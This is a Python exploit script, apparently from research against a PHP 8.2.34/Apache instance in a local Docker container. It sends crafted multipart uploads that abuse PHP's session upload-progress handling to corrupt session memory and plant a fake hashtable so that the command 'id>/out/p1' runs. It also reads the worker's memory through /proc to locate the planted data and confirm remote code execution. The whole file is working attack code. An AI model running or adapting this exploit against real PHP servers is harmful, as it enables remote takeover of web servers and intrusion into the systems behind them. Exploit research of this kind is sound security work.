import os
import subprocess, time, struct, os, importlib.util

BASE = os.path.dirname(os.path.abspath(__file__))
c = "p2s8234"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

spec = importlib.util.spec_from_file_location("exploit", os.path.join(BASE, "exploit.py"))
em = importlib.util.module_from_spec(spec)
spec.loader.exec_module(em)
Target = em.Target
build_multipart = em.build_multipart
SID = em.SID
MAX_CMD = em.MAX_CMD

def get_worker():
    r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    pid = pids[-1]
    r = sh(f'docker exec {c} sh -c "grep libphp /proc/{pid}/maps 2>/dev/null | head -1"')
    B = int(r.stdout.strip().split("-")[0], 16)
    return pid, B

def read_mem(pid, addr, size):
    r = subprocess.run(
        f'docker exec {c} sh -c "dd if=/proc/{pid}/mem bs=1 skip={addr} count={size} 2>/dev/null"',
        shell=True, capture_output=True
    )
    return r.stdout

# --- 8.2.34 offsets ---
zif_off = 0x39b8a0
dtor_off = 0x487650
htdata_off = 0x690d8  # placeholder; carrier POSITION is what we measure

pid, B = get_worker()
ps_base = B + 0xf3a120
ps_hsv = ps_base + 0x140   # http_session_vars offset for 8.2.34
print(f"[*] worker={pid} libphp_base={B:#x}", flush=True)
print(f"[*] ps_hsv={ps_hsv:#x}  zif_off={zif_off:#x} dtor_off={dtor_off:#x}", flush=True)

def build_fake_payload(htdata, zif, cmd=b"id>/out/p1"):
    if len(cmd) > MAX_CMD:
        cmd = cmd[:MAX_CMD]
    ht = bytearray(b"\x00" * 167)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)
    struct.pack_into("<Q", ht, E + 0x08, 0)
    struct.pack_into("<Q", ht, E + 0x10, zif)
    struct.pack_into("<Q", ht, E + 0x18, 0)
    struct.pack_into("<Q", ht, E + 0x20, 0)
    struct.pack_into("<I", ht, E + 0x28, 0)
    struct.pack_into("<I", ht, E + 0x2C, 1)
    struct.pack_into("<Q", ht, E + 0x30, 0)
    struct.pack_into("<Q", ht, E + 0x38, 0)
    struct.pack_into("<I", ht, E + 0x40, 0)
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, E + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)

target = Target("http://127.0.0.1:18111/index.php", timeout=120, verbose=False)
pads = [(31, 31)] * 6

parts_a = [
    {"name": "PHPSESSID", "data": b"a" * 19},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
]
for i, (nl, vl) in enumerate(pads):
    name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
    parts_a.append({"name": name, "data": b"V" * vl})
parts_a.append({"name": "f", "filename": "a.txt", "data": b"A" * 64})
parts_a.append({"name": "big", "data": b"B" * (12 * 1024 * 1024)})
body_a = build_multipart(parts_a, b"S" * 17)
print(f"[*] Request A: {len(body_a)} bytes", flush=True)
resp_a = target.post(body_a, b"S" * 17, read_cap=1 << 20, timeout=120,
                      extra_headers={"Cookie": "PHPSESSID=" + "a" * 32})
print(f"[+] Request A response: {len(resp_a)} bytes", flush=True)
time.sleep(0.5)

# --- Read PS(http_session_vars) after A ---
data = read_mem(pid, ps_hsv, 16)
R = 0
tinfo = 0
if len(data) >= 16:
    R = struct.unpack("<Q", data[:8])[0]
    tinfo = struct.unpack("<I", data[8:12])[0]
    print(f"[+] PS(http_session_vars) after A: value=0x{R:x}  type_info=0x{tinfo:04x}", flush=True)
    if R != 0:
        # read the reference at R
        ref = read_mem(pid, R, 16)
        if len(ref) >= 16:
            rc = struct.unpack("<I", ref[:4])[0]
            rtype = struct.unpack("<I", ref[4:8])[0]
            rval = struct.unpack("<Q", ref[8:16])[0]
            print(f"    ref@R: rc={rc} type=0x{rtype:02x} val.value=0x{rval:x}", flush=True)
    else:
        print("[!] PS(http_session_vars) is 0 (UNDEF) after A", flush=True)
else:
    print(f"[!] Could not read PS(http_session_vars) (got {len(data)} bytes)", flush=True)

# --- Send request B (write) ---
print(f"\n[*] Sending request B (write)...", flush=True)
# placeholder htdata: chunk base + offset; we don't know chunk base yet, use a dummy
# The carrier POSITION is independent of htdata value, so use a fixed placeholder.
dummy_chunk = 0x5a3f60000000
htdata = dummy_chunk + htdata_off
ht = build_fake_payload(htdata, zif_off)
carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
print(f"[*] carrier = {carrier.hex()}", flush=True)

parts_b = [
    {"name": "PHPSESSID", "data": SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for i in range(2):
    parts_b.append({"name": f"f{i:02d}", "data": b"F" * 15})
parts_b.append({"name": "g00", "data": carrier})
for i in range(15):
    parts_b.append({"name": f"a{i:030d}"[:31], "data": ht})
body_b = build_multipart(parts_b, b"B" * 10)
resp_b = target.post(body_b, b"B" * 10, read_cap=65536, timeout=30)
print(f"[+] Request B response: {len(resp_b)} bytes", flush=True)
time.sleep(0.5)

# --- Re-read PS(http_session_vars) after B ---
data_b = read_mem(pid, ps_hsv, 16)
R_b = 0
if len(data_b) >= 16:
    R_b = struct.unpack("<Q", data_b[:8])[0]
    tinfo_b = struct.unpack("<I", data_b[8:12])[0]
    print(f"[+] PS(http_session_vars) after B: value=0x{R_b:x}  type_info=0x{tinfo_b:04x}", flush=True)

# --- Search for carrier in heap ---
print(f"\n[*] Searching for carrier in heap around R...", flush=True)
if R != 0:
    search_start = R - 0x200000
    search_end = R + 0x200000
    found = []
    for off in range(0, search_end - search_start, 0x10000):
        chunk_start = search_start + off
        chunk = read_mem(pid, chunk_start, 0x10000)
        if len(chunk) < 16:
            continue
        idx = chunk.find(carrier)
        while idx != -1:
            found.append(chunk_start + idx)
            idx = chunk.find(carrier, idx + 1)
    if found:
        print(f"[+] Carrier found at {len(found)} location(s):", flush=True)
        for f in found:
            rel = f - R
            relb = f - R_b if R_b else 0
            print(f"    0x{f:016x}  (R+{rel:+x}  R_b+{relb:+x})", flush=True)
    else:
        print("[!] Carrier not found in heap search range", flush=True)

# --- Check RCE proof ---
print(f"\n[*] Checking for RCE proof...", flush=True)
r = sh(f'docker exec {c} sh -c "cat /out/p1 2>/dev/null || cat /www/p1 2>/dev/null || cat /tmp/p1 2>/dev/null"')
if r.stdout.strip():
    print(f"[+] RCE PROOF: {r.stdout.strip()}", flush=True)
else:
    print("[-] No RCE proof found", flush=True)

print(f"\n[*] Done.", flush=True)
